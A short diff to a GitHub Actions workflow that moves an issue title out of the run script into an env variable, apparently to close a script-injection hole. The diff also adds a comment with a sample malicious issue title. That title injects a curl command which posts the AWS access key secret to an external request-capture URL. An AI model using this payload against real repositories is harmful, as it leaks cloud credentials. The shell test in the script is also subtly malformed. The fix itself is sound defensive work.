@@ -16,11 +16,15 @@ jobs:
         - name: add a label
           env:
              AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+             issues_title: ${{github.event.issue.title}}
           run: |
-            issues_title="${{github.event.issue.title}}"
+            
             if [["$issues_title" == *"bug"* ]]; then
                 echo "isses is about abug!"
                 echo "assign label.. ... ... ."
             else
                 echo "not abug"
             fi
+
+#title in issues to test hack - ling in httpdump
+#bug";curl --request POST --data anything=$AWS_ACCESS_KEY_ID https://httpdump.app/dumps/ffc640cc-13be-44a4-9f43-356676f7296d"
